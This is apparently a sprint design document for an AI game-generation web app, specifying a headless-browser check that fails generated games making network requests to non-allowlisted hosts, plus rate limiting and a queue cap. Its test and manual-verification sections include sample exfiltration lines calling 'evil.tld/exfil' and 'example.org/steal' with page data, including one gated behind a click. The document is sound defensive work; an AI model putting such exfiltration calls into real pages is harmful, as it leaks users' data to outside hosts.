# Sprint 3 — Generation Pipeline Hardening (Runtime Egress Check + Rate Limiting)

See [00-overview.md](00-overview.md) for the full rationale. Two changes
bundled together because both touch the generation request path and are
naturally exercised by the same test pass: (A) a runtime network-egress
check added to `smoke_test.py`, which is the only layer that can catch a
JS-obfuscated URL (`atob(...)`, string concatenation) since Sprints 1-2
both work on static markup; and (B) rate limiting on `/games/new` and
`/enhance`, an unrelated-but-adjacent cost/DoS control the review flagged
(no request volume limit currently exists at all).

## Part A: runtime network-egress check in `smoke_test.py`

`smoke_test.run_smoke_test()` (`smoke_test.py:20`) already loads the
generated HTML in headless Chromium via `page.goto(f"file://{html_path}")`
and listens for `pageerror`/`console` events. Extend it to also listen for
outbound requests and fail the attempt if any target a host outside
`safety.ALLOWED_CDN_HOSTS` — this is what catches a URL the model built
at runtime (base64-decoded, string-concatenated) that never appears as a
literal string in the HTML source for `safety.py` to match.

- Add a `page.on("request", on_request)` handler alongside the existing
  `pageerror`/`console` handlers. For each request, parse its URL; skip
  `file://` (the page loading itself and any same-directory relative
  asset) and `data:`/`blob:` URIs (inline, no network reach). For
  anything else, extract the host and check it against
  `safety.ALLOWED_CDN_HOSTS` (import `safety` at the top of
  `smoke_test.py`); if it's not in the allowlist, append an
  `"blocked network request to disallowed host '{host}' ({url})"` entry
  to the existing `errors` list — reuse the exact same failure path the
  function already uses for `pageerror`/`console.error`, so a caught
  egress attempt fails the smoke test exactly like a JS crash does today
  (`game_generator.py`'s retry loop already treats any `smoke_test`
  failure as `smoke_test_failed` and feeds it back to the model to fix,
  with no other changes needed there).
- **Simulate minimal interaction before the existing 2-second
  `wait_for_timeout`.** Malicious navigation/exfiltration code is likely
  gated behind a user action ("on win, redirect to bonus site") rather
  than firing on load — a pure load-and-wait smoke test would never
  trigger it. After `page.goto()` succeeds, dispatch a couple of generic
  synthetic events before the wait: a `page.mouse.click()` at the page
  center and a `page.keyboard.press("Space")` (arbitrary but common
  game-input keys are fine — this doesn't need to "win" the game, just
  exercise its input handlers). This is a low-cost addition that also
  incidentally improves the existing crash-detection coverage the
  smoke test was already meant to provide, per its own docstring.
- Keep the function signature unchanged (`run_smoke_test(html_path,
  timeout_seconds=20) -> tuple[bool, str]`) — this stays a drop-in
  extension of the existing implementation.

## Part B: rate limiting on `/games/new` and `/enhance`

- Add an `ip_address` column to `generation_requests` via the existing
  `_ADDED_COLUMNS`/`_ensure_columns()` migration pattern in `db.py`
  (`db.py:165-200`) — append `("ip_address", "TEXT")` to the
  `generation_requests` entry, and pass `ip_address=request.remote_addr`
  through `db.create_generation_request()` (extend its signature and
  `INSERT` alongside the existing `creator_uid` parameter).
- Add `db.count_recent_generation_requests(creator_uid, ip_address,
  since_iso, conn=None) -> int`: `SELECT COUNT(*) FROM
  generation_requests WHERE created_at >= ? AND (creator_uid = ? OR
  ip_address = ?)`, mirroring the existing "OR" logic `ratings`' two
  `UNIQUE` constraints already encode (block on cookie *or* IP,
  whichever fires first) — same anti-abuse posture the codebase already
  chose for votes, reused here for request volume.
- In `app.py`'s `new_game_submit()` (`app.py:510`) and
  `enhance_game_submit()` (`app.py:595`), before calling
  `db.create_generation_request()`, check
  `db.count_recent_generation_requests(vg_uid, request.remote_addr,
  since_iso=<now - window>, conn=get_db())` against a configured
  threshold; if over it, re-render the form with a 429 status and a
  "you're generating games too quickly — try again in a few minutes"
  error instead of queuing the job. Suggested defaults: **5 requests per
  1-hour window** per cookie-or-IP — generous enough for legitimate
  iterative use (a player enhancing their own game a few times in a
  session), tight enough to bound worst-case DeepSeek token spend from a
  single abusive source. Make the count and window config values (e.g.
  `job_runner:` block in `config.yaml.example`, or a small new
  `rate_limit:` block) rather than hardcoded, so they can be tuned
  without a code change.
- This is intentionally the same "poll the DB, no in-memory state"
  philosophy `job_runner.py` already uses for correctness under multiple
  gunicorn worker processes — no new shared-state mechanism introduced.

### Part B addendum: global queue depth cap

The per-requester limit above bounds one cookie-or-IP's own volume, but
`job_runner.py` only ever caps *concurrent processing* to one job at a time
(`claim_next_queued_request`'s guard) — nothing previously bounded how many
jobs could pile up with `status='queued'`. Many different requesters, each
comfortably under their own rate limit, could otherwise queue an unbounded
backlog. Added:

- `db.count_active_generation_requests(conn=None) -> int`: `SELECT COUNT(*)
  FROM generation_requests WHERE status IN ('queued', 'generating')` — total
  jobs currently pending or running, across every requester.
- A `max_queue_size` key alongside `max_requests`/`window_seconds` in the
  `rate_limit:` config block, default **5**. Checked in both
  `new_game_submit()` and `enhance_game_submit()` *before* the per-requester
  check (a full queue is a systemic condition, not specific to whoever's
  asking) — if `count_active_generation_requests() >= max_queue_size`,
  reject with a 503 and "the generation queue is full right now — try again
  in a few minutes" instead of queuing the job.

## Tests

- `tests/test_smoke_test.py` (new file): using a `tmp_path` HTML fixture
  (skip if Playwright/Chromium isn't installed, matching how
  `test_generation_loop.py` already mocks around network/browser
  dependencies) —
  - A game whose script does `fetch('https://evil.tld/exfil?x=1')` on
    load fails `run_smoke_test()` with a detail string mentioning
    `"blocked network request"` and the disallowed host.
  - A game that loads a script from an allowlisted CDN host (e.g.
    `cdn.jsdelivr.net`) still passes (mock/stub the actual network call
    if tests must stay offline — assert the allowlist check itself
    doesn't misfire on `file://`/`data:`/allowlisted-host requests, not
    that the CDN is actually reachable in CI).
  - A game whose exfiltration only fires `onclick` is caught once the
    synthetic click is added, and — as a regression check — was *not*
    caught by a version of the test that skips the synthetic
    click/keypress step (documents why that part of Part A exists).
- `tests/test_db.py`: add cases for
  `count_recent_generation_requests` — 5 requests inside the window from
  the same `creator_uid` (different `ip_address`) count correctly; a 6th
  from a *different* `creator_uid` but the *same* `ip_address` still
  counts (proves the OR logic); requests outside the window don't count.
- `tests/test_generation_loop.py` or a new integration test: hitting
  `POST /games/new` past the configured threshold (same `vg_uid` cookie
  across requests via the Flask test client) returns 429 with the rate
  limit error and does **not** insert a new `generation_requests` row.

## Manual verification

1. Build a throwaway `index.html` fixture that does
   `fetch('https://example.org/steal?c=' + document.title)` on a
   button click; run `python3 -c "import smoke_test;
   print(smoke_test.run_smoke_test('path/to/fixture.html'))"` and
   confirm it returns `(False, "...blocked network request...")`.
2. `python3 app.py`, submit 6 `/games/new` requests in quick succession
   from the same browser session; confirm the 6th is rejected with the
   rate-limit message and no new `status/<job_id>` page/job is created
   for it (check `generation_requests` row count via `sqlite3
   vibegames.db`).

## Acceptance criteria

- `run_smoke_test()` fails any generated game that attempts a network
  request (on load or on a basic simulated click/keypress) to a host
  outside `safety.ALLOWED_CDN_HOSTS`, and `game_generator.py`'s existing
  retry loop treats it exactly like any other smoke-test failure with no
  code changes required there.
- `/games/new` and `/enhance` reject excess requests from the same
  cookie-or-IP within the configured window with a 429 and a clear error
  message, without inserting a `generation_requests` row.
- `/games/new` and `/enhance` also reject when the total number of
  queued-or-generating jobs across all requesters is at `max_queue_size`,
  with a 503 and a clear error message, without inserting a
  `generation_requests` row.
- Rate limit threshold/window/max_queue_size are configurable, not
  hardcoded.
- `pytest` passes, including the new `tests/test_smoke_test.py` and the
  `test_db.py`/rate-limit additions.
